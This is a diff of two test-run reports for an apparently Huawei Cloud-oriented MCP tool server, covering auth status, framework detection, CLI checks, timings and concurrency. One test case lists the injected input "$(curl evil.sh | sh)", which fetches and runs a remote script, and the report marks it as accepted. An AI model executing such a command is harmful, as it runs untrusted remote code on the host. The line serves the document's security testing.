@@ -11,7 +11,7 @@ isError: false | 返回含 credentialsConfigured 字段: true
 结构化字段: 
 =====END D2-2=====
 =====CASE D2-5=====
-无凭证 auth_status: {"content":[{"type":"text","text":"{\n  \"target\": \"all\",\n  \"credentialsConfigured\": false,\n  \"credentialsPath\": \"/tmp/multica-task-1783835658/hdk-nocred-BvXRaM/.config/huaweicloud/credentials.json\",\n  \"mcpSettingsConfigured\": false,\n  \"mcpSettingsSource\": null,\n  \"stsExpiry\": null,\n  \"credentialPanel\": {\n    \"sts\": null,\n    \"s1\": {\n      \"configured\": false,\n      \"fingerprint\": null,\n      \"persistent\": true\n    },\n    \"activeSource\": \"none\"\n  },\n
+无凭证 auth_status: {"content":[{"type":"text","text":"{\n  \"target\": \"all\",\n  \"credentialsConfigured\": false,\n  \"credentialsPath\": \"/tmp/multica-task-1783835658/hdk-nocred-LflYbT/.config/huaweicloud/credentials.json\",\n  \"mcpSettingsConfigured\": false,\n  \"mcpSettingsSource\": null,\n  \"stsExpiry\": null,\n  \"credentialPanel\": {\n    \"sts\": null,\n    \"s1\": {\n      \"configured\": false,\n      \"fingerprint\": null,\n      \"persistent\": true\n    },\n    \"activeSource\": \"none\"\n  },\n
 needsSetup / 可执行指引 判定: true
 =====END D2-5=====
 =====CASE D3-A1=====
@@ -27,8 +27,7 @@ run_readonly(hcloud --version) isError: false
 输出(前300): {"content":[{"type":"text","text":"{   \"ok\": true,   \"exitCode\": 0,   \"signal\": null,   \"stdout\": \"[USE_ERROR]The --version parameter format must be '--param=value'.\ \",   \"stderr\": \"\",   \"plan\": {     \"executable\": \"hcloud\",     \"args\": [       \"--version\"     ],     \"comma
 =====END D3-B3=====
 =====CASE D3-B5=====
-detect_framework(sample-react): {"content":[{"type":"text","text":"{\n  \"ok\": true,\n  \"type\": \"spa\",\n  \"framework\": \"Vite (React/Vue/Svelte)\",\n  \"installCmd\": \"npm install\",\n  \"buildCmd\": \"npm run build\",\n  \"outputDir\": \"dist\",\n  \"port\": 8080,\n  \"serveCmd\": null,\n  \"checkUrl\": \"http://localhost:8080\",\n  \"nginxType\": \"spa\",\n  \"packageManager\": \"npm\",\n  \"rootDir\": \"/tmp/sample-re
-识别出 framework 判定: true
+EXCEPTION: Cannot read properties of undefined (reading 'slice')
 =====END D3-B5=====
 =====CASE D3-C5=====
 check_cli isError: false | 返回: {"content":[{"type":"text","text":"{\n  \"installed\": true,\n  \"authenticated\": true,\n  \"status\": \"version_mismatch\",\n  \"output\": \"Current KooCLI version: 7.2.12\",\n  \"kooCliVersion\": \
@@ -54,18 +53,18 @@ command="$(curl evil.sh | sh)" => isError=false | 结论=ok
 command="\\x00\\x01 garbage \u0000" => isError=false | 结论=ok
 =====END D4-17=====
 =====CASE D6-1=====
-search_docs 5次耗时(ms): 6, 6, 6, 6, 8
+search_docs 5次耗时(ms): 5, 5, 6, 8, 10
 p95 判定(<2000ms): true
 =====END D6-1=====
 =====CASE D6-3=====
-冷启(进程 spawn -> initialize 响应) = 310 ms
+冷启(进程 spawn -> initialize 响应) = 242 ms
 冷启<5000ms 判定: true
 =====END D6-3=====
 =====CASE D6-4=====
 并发15 tools/list 工具数集合: 46 | 无死锁/消息错乱(全部返回40): false
 =====END D6-4=====
 === stderr(应有协议污染检查) ===
-(node:1544210) [DEP0190] DeprecationWarning: Passing args to a child process with shell option true can lead to security vulnerabilities, as the arguments are not escaped, only concatenated.
+(node:1548949) [DEP0190] DeprecationWarning: Passing args to a child process with shell option true can lead to security vulnerabilities, as the arguments are not escaped, only concatenated.
 (Use `node --trace-deprecation ...` to show where the warning was created)
 
 === DONE ===
